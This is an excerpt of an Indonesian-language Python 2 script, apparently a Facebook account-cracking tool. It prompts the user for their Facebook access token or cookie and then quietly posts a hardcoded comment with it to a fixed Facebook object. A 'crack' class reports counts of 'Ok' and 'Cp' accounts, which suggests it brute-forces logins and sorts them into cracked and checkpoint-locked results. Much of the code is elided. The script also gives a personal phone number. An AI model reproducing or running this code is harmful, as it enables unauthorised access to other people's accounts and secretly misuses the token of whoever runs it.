...
# YF     : KANG TUTORIAL
# GITHUB : BANG JACK123
# YANG MAU REKODE SUSCIBE DULU CHENEL AKU YAH
# MODAL KUOTA 10 MB JUGA BISA KAN 
# MAKASIH BUAT KAMU YANG UDG SUSCRIBE
# NIH WA KU : 081329511668
# maksih ya
...
def komen(): # Boleh Di Tanbahin Jangan Di Ganti #
	...
	kata = random.choice(["Kita harus melakukan yang terbaik yang kita mampu. Itu adalah tanggung jawab manusia yang suci.","Orang yang ekstrem mendapatkan hasil yang ekstrem.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Belajar untuk menjadi tenang dan kamu akan selalu bahagia.","Dari kesalahan ke kesalahan seseorang menemukan seluruh kebenaran.","Jalan yang sulit sering kali mengarah ke tujuan yang indah.","Hal-hal hebat tidak pernah datang dari zona nyaman.","Jika kamu tidak mau mengambil risiko yang tidak biasa, kamu harus puas dengan yang biasa.","Nikmati setiap momen dalam hidup karena kamu tidak tahu apa yang akan terjadi besok."])
        ...
        requests.post('https://graph.facebook.com/233862391905006/comments/?message=Ijin Pake Scripnya bang Irpan❤️&access_token=' + toket) #mochIrpan
        print ('[•] Login Berhasil')
	os.system('clear')
	print ('[•] Suscribe dulu biar dapet ok ')
...
def login():
    ...
    print('║ [2] Login Menggunakan Cookien            ║')
    print('║ [0] Keluar/Exit !                        ║')
    print('╚══════════════════════════════════════════╝')
    lg = raw_input('[?] METODE : ')
    if lg == '':
        ...
        toket = raw_input("[?] Token Nya bang : ") # Login Token
        try:
...
def menu():
  ...
  print logo
  print('\033[37;1m╔════════════════════════════════════════════════════╗')
  print('║ [•] Author  : Khamdihi                             ║')
  print('║ [•] YT      : KANG TUTORIAL                        ║')
  print('║ [•] GITHUB  : BANG JACK                            ║')
  print('╚════════════════════════════════════════════════════╝')
  print('╔════════════════════════════════════════════════════╗')
...
class crack:
	...
	def main(self,fl):
		try:
			...
			self.ko+=1
			print "\r[Crot Crack] %s/%s *Ok : %s - *Cp : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)
class crack1:
	def __init__(self):
